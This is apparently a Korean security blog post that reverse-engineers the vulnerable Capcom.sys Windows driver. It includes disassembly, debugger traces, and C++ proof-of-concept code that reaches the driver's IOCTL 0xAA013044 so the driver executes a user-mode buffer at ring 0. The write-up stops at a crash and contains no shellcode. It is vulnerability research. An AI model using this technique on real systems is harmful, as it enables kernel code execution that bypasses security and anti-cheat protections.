---
layout: article
title: "[Vuln]Capcom Driver Vulnerability"
key: 20191103
tags:
  - Kernel
  - Reversing
  - Windows
  - Vuln
toc: true
mathjax: true
mathjax_autoNumber: true
published : true
---

# [+] Capcom Driver Vulnerability

<!--more-->

## [+] Summary

약 3년전에 `Capcom` 드라이버 관련 된 버그가 공개됐었다. 내용인즉, 해당 드라이버를 이용하여 링0 권한으로 명령 실행이 가능하다는 점이었다. 이로인해 각종 안티치트 드라이버들이 무력화되는 현상도 있었으며 널리 악용되었었다.

어떠한 버그였는지 분석하고 관련 내용들을 정리한다.

## [+] Analysis

분석 환경은 다음과 같다.

- Windows 10, 1809(OS Build 17763.805), Virtual Machine

취약한 드라이버를 디스어셈블러를 이용하여 열어 함수 및 코드를 정리한다.

### [-] Function

```
sub_103AC	.text	00000000000103AC	000000D0	00000048	00000000	R	.	.	.	.	.	.
sub_1047C	.text	000000000001047C	00000065	00000038	00000000	R	.	.	.	.	.	.
sub_104E4	.text	00000000000104E4	0000003D	00000028	00000000	R	.	.	.	.	.	.
sub_10524	.text	0000000000010524	0000006B	00000048	00000008	R	.	.	.	.	.	.
sub_10590	.text	0000000000010590	000000AC	00000038	00000000	R	.	.	.	.	.	.
DriverEntry	.text	000000000001063C	0000011B	00000078	00000018	R	.	.	.	.	T	.
sub_10788	.text	0000000000010788	00000011	00000000	00000000	R	.	.	.	.	.	.
sub_107A0	.text	00000000000107A0	00000008	00000000	00000000	R	.	.	.	.	.	.
```

### [-] Section

```
HEADER	0000000000010000	0000000000010300	?	?	?	.	L	page	0002	public	DATA	64	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.idata	0000000000010300	0000000000010340	R	.	X	.	L	para	0001	public	CODE	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.text	0000000000010340	0000000000010800	R	.	X	.	L	para	0001	public	CODE	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.data	0000000000010800	0000000000010900	R	W	.	.	L	para	0003	public	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.pdata	0000000000010900	0000000000010980	R	.	.	.	L	para	0004	public	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.info	0000000000010980	0000000000010A80	R	W	.	.	L	para	0005	public	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
INIT	0000000000010A80	0000000000010C00	R	W	X	.	L	para	0006	public	CODE	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
GAP	0000000000010C00	0000000000011000	R	W	.	.	L	byte	0000	private	DATA	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
```

### [-] String

```
.text:0000000000010758	0000001A	C (16 bits) - UTF-16LE	\\DosDevices\\
.text:0000000000010774	00000012	C (16 bits) - UTF-16LE	\\Device\\
.info:0000000000010988	00000006	C (16 bits)	KsT
.info:00000000000109AA	00000008	C (32 bits)	s
INIT:0000000000010B86	0000000D	C	ntoskrnl.exe
GAP:0000000000010CCA	0000000D	C	Western Cape1
GAP:0000000000010CE0	0000000D	C	\vDurbanville1
GAP:0000000000010CF7	00000007	C	Thawte1
GAP:0000000000010D08	00000015	C	Thawte Certification1
GAP:0000000000010D27	00000017	C	Thawte Timestamping CA0
GAP:0000000000010D40	0000000E	C	\r121221000000Z
GAP:0000000000010D4F	00000014	C	\r201230235959Z0^1\v0\t
GAP:0000000000010D77	00000018	C	Symantec Corporation100.
GAP:0000000000010D95	00000029	C	'Symantec Time Stamping Services CA - G20
GAP:0000000000010E33	00000005	C	r\x1B&Mq
GAP:0000000000010ECB	00000005	C	]jxdE
GAP:0000000000010F15	00000005	C	&0$0\"
GAP:0000000000010F26	00000017	C	http://ocsp.thawte.com0
GAP:0000000000010F58	00000005	C	80604
GAP:0000000000010F62	00000030	C	.http://crl.thawte.com/ThawteTimestampingCA.crl0
GAP:0000000000010FD0	00000012	C	TimeStamp-2048-10\r
```



### [-] DriverEntry

```
.text:000000000001063C ; NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
.text:000000000001063C                 public DriverEntry
.text:000000000001063C DriverEntry     proc near               ; DATA XREF: HEADER:00000000000100E8↑o
.text:000000000001063C                                         ; .pdata:0000000000010930↓o ...
.text:000000000001063C
.text:000000000001063C DeviceCharacteristics= dword ptr -58h
.text:000000000001063C Exclusive       = byte ptr -50h
.text:000000000001063C DeviceObject    = qword ptr -48h
.text:000000000001063C DestinationString= UNICODE_STRING ptr -38h
.text:000000000001063C SymbolicLinkName= UNICODE_STRING ptr -28h
.text:000000000001063C arg_10          = qword ptr  18h
.text:000000000001063C
.text:000000000001063C                 push    rbx
.text:000000000001063E                 push    rdi
.text:000000000001063F                 sub     rsp, 68h
.text:0000000000010643                 mov     rbx, rcx
.text:0000000000010646                 lea     rdi, __ImageBase
.text:000000000001064D                 lea     r11, unk_10880
.text:0000000000010654                 xor     ecx, ecx
.text:0000000000010656
.text:0000000000010656 loc_10656:                              ; CODE XREF: DriverEntry+2E↓j
.text:0000000000010656                 movzx   eax, word ptr [rcx+rdi+774h]
.text:000000000001065E                 mov     [rcx+r11], ax
.text:0000000000010663                 add     rcx, 2
.text:0000000000010667                 test    ax, ax
.text:000000000001066A                 jnz     short loc_10656
.text:000000000001066C                 lea     rdx, unk_10980
.text:0000000000010673                 mov     rcx, r11
.text:0000000000010676                 call    sub_103AC
.text:000000000001067B                 lea     rcx, [rsp+78h+DestinationString] ; DestinationString
.text:0000000000010680                 mov     rdx, r11        ; SourceString
.text:0000000000010683                 call    cs:RtlInitUnicodeString
.text:0000000000010689                 lea     r11, [rsp+78h+arg_10]
.text:0000000000010691                 lea     r8, [rsp+78h+DestinationString] ; DeviceName
.text:0000000000010696                 mov     [rsp+78h+DeviceObject], r11 ; DeviceObject
.text:000000000001069B                 mov     r9d, 0AA01h     ; DeviceType
.text:00000000000106A1                 xor     edx, edx        ; DeviceExtensionSize
.text:00000000000106A3                 mov     rcx, rbx        ; DriverObject
.text:00000000000106A6                 mov     [rsp+78h+Exclusive], 0 ; Exclusive
.text:00000000000106AB                 mov     [rsp+78h+DeviceCharacteristics], 0 ; DeviceCharacteristics
.text:00000000000106B3                 call    cs:IoCreateDevice
.text:00000000000106B9                 test    eax, eax
.text:00000000000106BB                 js      loc_10750
.text:00000000000106C1                 xor     ecx, ecx
.text:00000000000106C3                 lea     r11, unk_10840
.text:00000000000106CA
.text:00000000000106CA loc_106CA:                              ; CODE XREF: DriverEntry+A2↓j
.text:00000000000106CA                 movzx   eax, word ptr [rcx+rdi+758h]
.text:00000000000106D2                 mov     [rcx+r11], ax
.text:00000000000106D7                 add     rcx, 2
.text:00000000000106DB                 test    ax, ax
.text:00000000000106DE                 jnz     short loc_106CA
.text:00000000000106E0                 lea     rdx, unk_10980
.text:00000000000106E7                 mov     rcx, r11
.text:00000000000106EA                 call    sub_103AC
.text:00000000000106EF                 lea     rcx, [rsp+78h+SymbolicLinkName] ; DestinationString
.text:00000000000106F4                 mov     rdx, r11        ; SourceString
.text:00000000000106F7                 call    cs:RtlInitUnicodeString
.text:00000000000106FD                 lea     rdx, [rsp+78h+DestinationString] ; DeviceName
.text:0000000000010702                 lea     rcx, [rsp+78h+SymbolicLinkName] ; SymbolicLinkName
.text:0000000000010707                 call    cs:IoCreateSymbolicLink
.text:000000000001070D                 test    eax, eax
.text:000000000001070F                 mov     edi, eax
.text:0000000000010711                 jns     short loc_10723
.text:0000000000010713                 mov     rcx, [rsp+78h+arg_10] ; DeviceObject
.text:000000000001071B                 call    cs:IoDeleteDevice
.text:0000000000010721                 jmp     short loc_1074E
.text:0000000000010723 ; ---------------------------------------------------------------------------
.text:0000000000010723
.text:0000000000010723 loc_10723:                              ; CODE XREF: DriverEntry+D5↑j
.text:0000000000010723                 lea     rax, sub_104E4
.text:000000000001072A                 mov     [rbx+80h], rax
.text:0000000000010731                 mov     [rbx+70h], rax
.text:0000000000010735                 lea     rax, sub_10590
.text:000000000001073C                 mov     [rbx+0E0h], rax
.text:0000000000010743                 lea     rax, sub_1047C
.text:000000000001074A                 mov     [rbx+68h], rax
.text:000000000001074E
.text:000000000001074E loc_1074E:                              ; CODE XREF: DriverEntry+E5↑j
.text:000000000001074E                 mov     eax, edi
.text:0000000000010750
.text:0000000000010750 loc_10750:                              ; CODE XREF: DriverEntry+7F↑j
.text:0000000000010750                 add     rsp, 68h
.text:0000000000010754                 pop     rdi
.text:0000000000010755                 pop     rbx
.text:0000000000010756                 retn
.text:0000000000010756 DriverEntry     endp
```

먼저 드라이버 엔트리의 첫 부분을 보자.

```
.text:000000000001063C                 push    rbx
.text:000000000001063E                 push    rdi
.text:000000000001063F                 sub     rsp, 68h
.text:0000000000010643                 mov     rbx, rcx
.text:0000000000010646                 lea     rdi, __ImageBase
.text:000000000001064D                 lea     r11, unk_10880
.text:0000000000010654                 xor     ecx, ecx
.text:0000000000010656
.text:0000000000010656 loc_10656:                              ; CODE XREF: DriverEntry+2E↓j
.text:0000000000010656                 movzx   eax, word ptr [rcx+rdi+774h]
.text:000000000001065E                 mov     [rcx+r11], ax
.text:0000000000010663                 add     rcx, 2
.text:0000000000010667                 test    ax, ax
.text:000000000001066A                 jnz     short loc_10656
```

초기 `RCX`에 있는 `DriverObject`를 `RBX`에 백업한다. 그리고 드라이버의 `ImageBase`를 `RDI` 레지스터에 저장하고, `R11` 레지스터에 특정 메모리 주소를 저장한 후에 `ECX` 레지스터를 0으로 초기화 한다.

`R11`의 위치에 어떠한 값을 저장하기 위한 사전 준비 로직이라고 볼 수 있다. 바로 아래의 `loc_10656` 반복문을 확인하면 확실하게 알 수 있다.

`movzx eax, word ptr [rcx+rdi+774h]` 의 경우 분석해보면 `\Device\` 라는 유니코드 문자열을 가지고 오는 것을 확인할 수 있다. 유니코드이기 때문에 `add rcx, 2` 로 2바이트씩 인덱스가 증가하게 된다.

그렇다면 해당 반복문 이후에 `DeviceName`에 대한 문자열을 가지고 올 것이라 추측이 가능하다.

```
lea     rdx, unk_10980
mov     rcx, r11
call    sub_103AC
lea     rcx, [rsp+78h+DestinationString] ; DestinationString
mov     rdx, r11        ; SourceString
call    cs:RtlInitUnicodeString
lea     r11, [rsp+78h+arg_10]
lea     r8, [rsp+78h+DestinationString] ; DeviceName
mov     [rsp+78h+DeviceObject], r11 ; DeviceObject
mov     r9d, 0AA01h     ; DeviceType
xor     edx, edx        ; DeviceExtensionSize
mov     rcx, rbx        ; DriverObject
mov     [rsp+78h+Exclusive], 0 ; Exclusive
mov     [rsp+78h+DeviceCharacteristics], 0 ; DeviceCharacteristics
call    cs:IoCreateDevice
test    eax, eax
js      loc_10750
```

위의 루틴을 보면 `RtlInitUnicodeString`을 통해 문자열을 할당하고, `IoCreateDevice` 함수를 호출하게 된다.
그리고 `sub_103AC` 함수가 숨겨놓은 디바이스 이름을 가져오는 함수라고 볼 수 있다.

디버깅을 통해 확인해본다.

```
1: kd> u Capcom+63c
Capcom+0x63c:
fffff803`2404063c 4853            push    rbx
fffff803`2404063e 57              push    rdi
fffff803`2404063f 4883ec68        sub     rsp,68h
fffff803`24040643 488bd9          mov     rbx,rcx
fffff803`24040646 488d3db3f9ffff  lea     rdi,[Capcom (fffff803`24040000)]
fffff803`2404064d 4c8d1d2c020000  lea     r11,[Capcom+0x880 (fffff803`24040880)]
fffff803`24040654 33c9            xor     ecx,ecx
fffff803`24040656 0fb7843974070000 movzx   eax,word ptr [rcx+rdi+774h]
1: kd> r $t0 = Capcom+0x63c
1: kd> bp $t0
```

```
1: kd> p
Capcom+0x66c:
fffff803`2404066c 488d150d030000  lea     rdx,[Capcom+0x980 (fffff803`24040980)]
1: kd> du r11
fffff803`24040880  "\Device\"
```

반복문을 빠져나온 뒤 확인하면 예상대로 `R11` 레지스터에 `\Device\` 유니코드 문자열이 저장된다. 복호화 함수로 예상되는 `sub_103AC` 함수는 두 개의 파라미터를 전달받으며, 첫번째 파라미터로 위에서 생성된 유니코드 문자열의 주소를 전달한다.

```
1: kd> p
Capcom+0x676:
fffff803`24040676 e831fdffff      call    Capcom+0x3ac (fffff803`240403ac)
1: kd> p
Capcom+0x67b:
fffff803`2404067b 488d4c2440      lea     rcx,[rsp+40h
1: kd> du rax
fffff803`24040880  "\Device\Htsysm72FB"
```

반환 값은 유니코드 문자열의 포인터를 반환하게 되며, 위와 같이 `Htsysm72FB`라는 `DeviceName`을 가진다는 것을 알 수 있다. `DriverEntry`에서 얻을 수 있는 정보는 이정도다. 그리고 `IoCreateDevice` 함수를 호출할 때 `DeviceType`이 `0xAA01`이라는 점을 기억해야 한다.

### [-] IRP Dispatch Routine

해당 함수를 찾을 수 있는 힌트는 바로 `IofCompleteRequest` 매크로에 있다. MSDN에서 함수가 아닌 매크로로 표현되어 있으니.. 나도 그렇게 쓴다.

해당 매크로를 MSDN에서 찾아보면 특정 I/O 요청에 대한 처리를 완료하고 I/O 매니저에게 `IRP`를 반환하는 매크로라고 서술되어 있다.

즉 `DeviceIoControl`과 같이 드라이버와의 메시지를 전달하는 경우 이에 대한 처리를 하고 적절한 값을 반환한다는 것으로 생각하면 될 듯 하다.

이러한 함수가 바로 `sub_10590` 함수이다. 

```
.text:0000000000010590 sub_10590       proc near               ; DATA XREF: DriverEntry+F9↓o
.text:0000000000010590                                         ; .pdata:0000000000010930↓o
.text:0000000000010590                 push    rbx
.text:0000000000010592                 push    rsi
.text:0000000000010593                 push    rdi
.text:0000000000010594                 sub     rsp, 20h
.text:0000000000010598                 mov     rax, [rdx+0B8h]
.text:000000000001059F                 mov     rdi, [rdx+18h]
.text:00000000000105A3                 xor     ecx, ecx
.text:00000000000105A5                 mov     [rdx+30h], ecx
.text:00000000000105A8                 mov     [rdx+38h], rcx
.text:00000000000105AC                 cmp     byte ptr [rax], 0Eh
.text:00000000000105AF                 mov     r9d, [rax+10h]
.text:00000000000105B3                 mov     r8d, [rax+8]
.text:00000000000105B7                 mov     rbx, rdx
.text:00000000000105BA                 mov     edx, [rax+18h]
.text:00000000000105BD                 jz      short loc_105C8
.text:00000000000105BF                 mov     dword ptr [rbx+30h], 0C0000002h
.text:00000000000105C6                 jmp     short loc_10626
.text:00000000000105C8 ; ---------------------------------------------------------------------------
.text:00000000000105C8
.text:00000000000105C8 loc_105C8:                              ; CODE XREF: sub_10590+2D↑j
.text:00000000000105C8                 mov     r11d, 0AA012044h
.text:00000000000105CE                 mov     eax, ecx
.text:00000000000105D0                 mov     esi, ecx
.text:00000000000105D2                 cmp     edx, r11d
.text:00000000000105D5                 mov     r10d, 0AA013044h
.text:00000000000105DB                 jz      short loc_105EC
.text:00000000000105DD                 cmp     edx, r10d
.text:00000000000105E0                 jnz     short loc_105F3
.text:00000000000105E2                 mov     eax, 8
.text:00000000000105E7                 lea     esi, [rax-4]
.text:00000000000105EA                 jmp     short loc_105F3
.text:00000000000105EC ; ---------------------------------------------------------------------------
.text:00000000000105EC
.text:00000000000105EC loc_105EC:                              ; CODE XREF: sub_10590+4B↑j
.text:00000000000105EC                 mov     esi, 4
.text:00000000000105F1                 mov     eax, esi
.text:00000000000105F3
.text:00000000000105F3 loc_105F3:                              ; CODE XREF: sub_10590+50↑j
.text:00000000000105F3                                         ; sub_10590+5A↑j
.text:00000000000105F3                 cmp     r9d, eax
.text:00000000000105F6                 jnz     short loc_1061F
.text:00000000000105F8                 cmp     r8d, esi
.text:00000000000105FB                 jnz     short loc_1061F
.text:00000000000105FD                 cmp     edx, r11d
.text:0000000000010600                 jz      short loc_1060C
.text:0000000000010602                 cmp     edx, r10d
.text:0000000000010605                 jnz     short loc_10615
.text:0000000000010607                 mov     rcx, [rdi]
.text:000000000001060A                 jmp     short loc_1060E
.text:000000000001060C ; ---------------------------------------------------------------------------
.text:000000000001060C
.text:000000000001060C loc_1060C:                              ; CODE XREF: sub_10590+70↑j
.text:000000000001060C                 mov     ecx, [rdi]
.text:000000000001060E
.text:000000000001060E loc_1060E:                              ; CODE XREF: sub_10590+7A↑j
.text:000000000001060E                 call    sub_10524
.text:0000000000010613                 mov     ecx, eax
.text:0000000000010615
.text:0000000000010615 loc_10615:                              ; CODE XREF: sub_10590+75↑j
.text:0000000000010615                 mov     eax, esi
.text:0000000000010617                 mov     [rdi], ecx
.text:0000000000010619                 mov     [rbx+38h], rax
.text:000000000001061D                 jmp     short loc_10626
.text:000000000001061F ; ---------------------------------------------------------------------------
.text:000000000001061F
.text:000000000001061F loc_1061F:                              ; CODE XREF: sub_10590+66↑j
.text:000000000001061F                                         ; sub_10590+6B↑j
.text:000000000001061F                 mov     dword ptr [rbx+30h], 0C000000Dh
.text:0000000000010626
.text:0000000000010626 loc_10626:                              ; CODE XREF: sub_10590+36↑j
.text:0000000000010626                                         ; sub_10590+8D↑j
.text:0000000000010626                 xor     edx, edx        ; PriorityBoost
.text:0000000000010628                 mov     rcx, rbx        ; Irp
.text:000000000001062B                 call    cs:IofCompleteRequest
.text:0000000000010631                 mov     eax, [rbx+30h]
.text:0000000000010634                 add     rsp, 20h
.text:0000000000010638                 pop     rdi
.text:0000000000010639                 pop     rsi
.text:000000000001063A                 pop     rbx
.text:000000000001063B                 retn
.text:000000000001063B sub_10590       endp
```

실제 어떠한 루틴을 거치는지 디버깅을 통해 수 많은 블루스크린을 겪어보며 진행을 해본다.

먼저 아래와 같은 코드를 컴파일한다.

```c++
#include <stdio.h>
#include <Windows.h>

int main()
{
	const wchar_t* deviceName = L"\\\\.\\Htsysm72FB";
	HANDLE driver = CreateFile(deviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 48, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);
	
	
	if (driver == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "Unable to access device driver\n");
		system("pause");
	}

	else {
		fprintf(stdout, "Device Handle : %p\n", driver);
		PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 48, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		DWORD bytesReturned = 0;
		DWORD ioctlOutput = 0;

		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8);

		if (DeviceIoControl(driver, IOCTL_SERIAL_LSRMST_INSERT, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
		{
			fprintf(stdout, "Call DeviceIoControl\n"); 
			system("pause");
		}
		else {
			fprintf(stderr, "Call DeviceIoControl Failed\n");
			system("pause");
		}

		CloseHandle(driver);
	}
}
```

디바이스 이름을 이용해 드라이버의 핸들을 획득하고 이를 통해 `DeviceIoControl` 함수를 호출하는 내용이다.
취약한 드라이버를 로드하고, 해당 디스패치 루틴에 브레이크 포인트를 설치한다.

이 후, 컴파일한 프로그램을 실행하여 어떻게 돌아가는지 확인해본다.

```
.text:00000000000105C8 loc_105C8:                              ; CODE XREF: sub_10590+2D↑j
.text:00000000000105C8                 mov     r11d, 0AA012044h
.text:00000000000105CE                 mov     eax, ecx
.text:00000000000105D0                 mov     esi, ecx
.text:00000000000105D2                 cmp     edx, r11d
.text:00000000000105D5                 mov     r10d, 0AA013044h
.text:00000000000105DB                 jz      short loc_105EC
.text:00000000000105DD                 cmp     edx, r10d
.text:00000000000105E0                 jnz     short loc_105F3
.text:00000000000105E2                 mov     eax, 8
.text:00000000000105E7                 lea     esi, [rax-4]
.text:00000000000105EA                 jmp     short loc_105F3
```

위와 같은 로직이 돌아가게 되는데, 잘 보면 `R11D`, `R10D`를 이용하여 무언가 비교하고있다. 하드코딩되어 `0xAA012044`와 `0xAA013044`를 각각 레지스터에 넣어, `EDX` 레지스터와 비교하는 모습을 볼 수 있다.

```
2: kd> r rdx
rdx=00000000001b007c
```

이 값이 무엇인가하니, 바로 `DeviceIoControl` 함수에서의 `dwIoControlCode` 에 해당한다. `IOCTL_SERIAL_LSRMST_INSERT` 라는 제어 코드는 16진수로 `0x001b007c`를 의미한다. 그렇다면 위의 로직은 바로 제어 코드를 확인하는 것임을 알 수 있다.

그러나 제어코드에서 위의 해당하는 `0xAA012044`, `0xAA013044` 라는 코드가 존재하지 않았다. 아마 개발자가 임의로 만들어놓고 쓰기 위해 직접 제어코드를 만든 것으로 보인다.

```
.text:00000000000105EC loc_105EC:                              ; CODE XREF: sub_10590+4B↑j
.text:00000000000105EC                 mov     esi, 4
.text:00000000000105F1                 mov     eax, esi
.text:00000000000105F3
.text:00000000000105F3 loc_105F3:                              ; CODE XREF: sub_10590+50↑j
.text:00000000000105F3                                         ; sub_10590+5A↑j
.text:00000000000105F3                 cmp     r9d, eax
.text:00000000000105F6                 jnz     short loc_1061F
.text:00000000000105F8                 cmp     r8d, esi
.text:00000000000105FB                 jnz     short loc_1061F
.text:00000000000105FD                 cmp     edx, r11d
.text:0000000000010600                 jz      short loc_1060C
.text:0000000000010602                 cmp     edx, r10d
.text:0000000000010605                 jnz     short loc_10615
.text:0000000000010607                 mov     rcx, [rdi]
.text:000000000001060A                 jmp     short loc_1060E
```

이후의 로직을 보면, 제어코드가 `0xAA012044` 인 경우, `loc_105EC` 흐름을 타고, `0xAA013044` 인 경우 `JMP` 문을 통해 바로 `loc_105F3` 로직의 흐름을 타는 것을 볼 수 있다.

이에 해당하는 제어코드는 바로 x86 과 x64 아키텍쳐를 구분하는 제어코드라고 한다. 이후 나오는 분기문들은 기본적인 것이므로 건너뛴다.

결론은 `dwIoControlCode`가 `0xAA013044` 로 전달됐을 때 뭔가 다른 로직을 타게 된다는 점이다. 이 때 다른 로직은 `sub_10524`를 의미한다. 그렇다면 이 함수를 호출할 수 있도록 조건문에 맞게 코딩을 해본다.

단순히 지역변수에 `const DWORD dwIoCtlCode = 0xAA013044;` 만 추가해줬다. 그렇게 실행하고 나면 정상적으로 `DeviceIoControl` 함수가 호출되는 것은 볼 수 있다. 하지만 내가 원하는 코드에 다다르지 못했다.

### [-] sub_10524(Vuln Func)

```
.text:0000000000010524 sub_10524       proc near               ; CODE XREF: sub_10590:loc_1060E↓p
.text:0000000000010524                                         ; DATA XREF: .pdata:0000000000010924↓o
.text:0000000000010524
.text:0000000000010524 var_28          = qword ptr -28h
.text:0000000000010524 var_20          = qword ptr -20h
.text:0000000000010524 var_18          = qword ptr -18h
.text:0000000000010524 arg_0           = qword ptr  8
.text:0000000000010524
.text:0000000000010524                 mov     [rsp+arg_0], rcx
.text:0000000000010529                 sub     rsp, 48h
.text:000000000001052D                 mov     rax, [rsp+48h+arg_0]
.text:0000000000010532                 mov     rcx, [rsp+48h+arg_0]
.text:0000000000010537                 cmp     [rax-8], rcx
.text:000000000001053B                 jz      short loc_10541
.text:000000000001053D                 xor     eax, eax
.text:000000000001053F                 jmp     short loc_1058A
.text:0000000000010541 ; ---------------------------------------------------------------------------
.text:0000000000010541
.text:0000000000010541 loc_10541:                              ; CODE XREF: sub_10524+17↑j
.text:0000000000010541                 mov     rax, [rsp+48h+arg_0]
.text:0000000000010546                 mov     [rsp+48h+var_20], rax
.text:000000000001054B                 mov     rax, cs:MmGetSystemRoutineAddress
.text:0000000000010552                 mov     [rsp+48h+var_18], rax
.text:0000000000010557                 mov     [rsp+48h+var_28], 0
.text:0000000000010560                 lea     rax, sub_10788
.text:0000000000010567                 lea     rcx, [rsp+48h+var_28]
.text:000000000001056C                 call    rax ; sub_10788
.text:000000000001056E                 mov     rcx, [rsp+48h+var_18]
.text:0000000000010573                 call    [rsp+48h+var_20]
.text:0000000000010577                 lea     rax, sub_107A0
.text:000000000001057E                 lea     rcx, [rsp+48h+var_28]
.text:0000000000010583                 call    rax ; sub_107A0
.text:0000000000010585                 mov     eax, 1
.text:000000000001058A
.text:000000000001058A loc_1058A:                              ; CODE XREF: sub_10524+1B↑j
.text:000000000001058A                 add     rsp, 48h
.text:000000000001058E                 retn
.text:000000000001058E sub_10524       endp
```

짧은 함수다. `MmGetSystemRoutineAddress` 는 링0에서 시스템 루틴의 주소를 얻어오는 `GetProcAddress`라고 생각하면 된다. 해당 함수가 호출될 때 보면 특정 포인터를 넘기고 이 값과 이 값의 -8한만큼의 값이 같은지 비교한다. 그리고 같으면 `loc_10541` 루틴의 흐름을 실행하게 된다.

먼저 이 함수가 호출될 때 파라미터 값을 확인해보면 `lpInBuffer` 라는 것을 알 수 있다. 위의 코드에서는 `VirtualAlloc`을 통해 주소 값을 할당하여 전달했다. 이 값을 가져와 `rax`, `rcx`에 옮기고 `cmp [rax-8], rcx` 명령으로 비교한다.

할당된 메모리 주소가 0x12345678 이라고 생각해보면, -8인 0x12345670 메모리에 안에 있는 값이 0x12345678 이어야 한다.

```c++
	else {
		fprintf(stdout, "Device Handle : %p\n", driver);
		PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 48, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		fprintf(stdout, "inBuffer : %p\n", inBuffer);
		DWORD bytesReturned = 0;
		DWORD ioctlOutput = 0;

		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);	// This
		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8);	// This

		if (DeviceIoControl(driver, dwIoCtlCode, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
		{
			fprintf(stdout, "Call DeviceIoControl\n"); 
			system("pause");
		}
		else {
			fprintf(stderr, "Call DeviceIoControl Failed\n");
			system("pause");
		}
```

주석처리 해놓은 부분이 위에 조건문을 맞춰주기 위함이다. 실제 디버거에서 값을 확인해보았다.

```
1: kd> r rax, rcx
rax=00000244c9c40008 rcx=00000244c9c40008
1: kd> u rip
Capcom+0x537:
fffff803`24040537 483948f8        cmp     qword ptr [rax-8],rcx
fffff803`2404053b 7404            je      Capcom+0x541 (fffff803`24040541
```

할당 된 주소는 `0x244c9c40000` 이다. 여기에 +8한 주소를 `inBuffer(0x244c9c40000)`에 넣는다.
그리고 `target` 이란 변수를 만들어 실제 할당 된 버퍼의 주소를 +8만큼 맞추어 `DeviceIoControl` 함수에 `lpInBuffer` 파라미터로 사용한다.

이렇게 되었기 때문에 현재 디버거에서 볼 수 있듯이 할당 된 메모리 공간의 주소를 원래의 +8 만큼인 `0x244c9c40008`로 전달되었고, 이로 인해 조건이 성립하며 내가 원하던 로직을 수행할 수 있게 된다.

정리하면...

```
		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);	// This
		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8);	// This
```

1. `inBuffer`는 `VirtualAlloc`을 통해 메모리 공간을 할당받았다.(`0x244c9c40000`)
2. `inBuffer(0x244c9c40000` 에 `inBuffer+8(0x244c9c40008)` 주소를 저장한다.
3. 실제 `DeviceIoControl` 호출 시 `lpInBuffer` 파라미터로 `inBuffer+8`을 전달한다.

```
fffff803`24040524 48894c2408      mov     qword ptr [rsp+8],rcx
fffff803`24040529 4883ec48        sub     rsp,48h
fffff803`2404052d 488b442450      mov     rax,qword ptr [rsp+50h]
fffff803`24040532 488b4c2450      mov     rcx,qword ptr [rsp+50h]
fffff803`24040537 483948f8        cmp     qword ptr [rax-8],rcx
fffff803`2404053b 7404            je      Capcom+0x541 (fffff803`24040541)	; 점프
...
fffff803`24040541 488b442450      mov     rax,qword ptr [rsp+50h]	; inBuffer 주소
fffff803`24040546 4889442428      mov     qword ptr [rsp+28h],rax ; [rsp+28] = &inBuffer
fffff803`2404054b 488b05c6fdffff  mov     rax,qword ptr [Capcom+0x318 (fffff803`24040318)] ; MmGetSystemRoutineAddress
fffff803`24040552 4889442430      mov     qword ptr [rsp+30h],rax
fffff803`24040557 48c744242000000000 mov   qword ptr [rsp+20h],0
fffff803`24040560 488d0521020000  lea     rax,[Capcom+0x788 (fffff803`24040788)]
fffff803`24040567 488d4c2420      lea     rcx,[rsp+20h]
fffff803`2404056c ffd0            call    rax	; blahblah function
fffff803`2404056e 488b4c2430      mov     rcx,qword ptr [rsp+30h]
fffff803`24040573 ff542428        call    qword ptr [rsp+28h]	; Bomb!!!
fffff803`24040577 488d0522020000  lea     rax,[Capcom+0x7a0 (fffff803`240407a0)]
fffff803`2404057e 488d4c2420      lea     rcx,[rsp+20h]
fffff803`24040583 ffd0            call    rax
fffff803`24040585 b801000000      mov     eax,1
fffff803`2404058a 4883c448        add     rsp,48h
fffff803`2404058e c3              ret
```

드디어 다왔다; 자 디버거로 해당 위치까지 잘 따라오면 `RAX`에는 `inBuffer`의 주소 값이 들어가있다. 그리고 이 값을 `rsp+28` 안에 저장한다. 즉 어떠한 함수의 6번째 파라미터로 전달하려고 저장한다고 볼 수 있을 것 같다. 이 어떠한 함수는 `sub_10788` 함수로 난해한 명령으로 되어있으며 스택을 사용하지 않는다.

이 함수를 지나고 다음 호출되는 `CALL qword ptr [rsp+28h]` 부분에서 블루스크린이 짠하고 등장하게 된다.
`inBuffer` 를 호출하게 됨으로써 현재 본인의 코드에는 아무 값도 없으므로 크래시가 나게 되는 것이다.

```
00000244`c9c40008 0000            add     byte ptr [rax],al ds:002b:00000000`00070678=??
00000244`c9c4000a 0000            add     byte ptr [rax],al
00000244`c9c4000c 0000            add     byte ptr [rax],al
00000244`c9c4000e 0000            add     byte ptr [rax],al
00000244`c9c40010 0000            add     byte ptr [rax],al
00000244`c9c40012 0000            add     byte ptr [rax],al
00000244`c9c40014 0000            add     byte ptr [rax],al
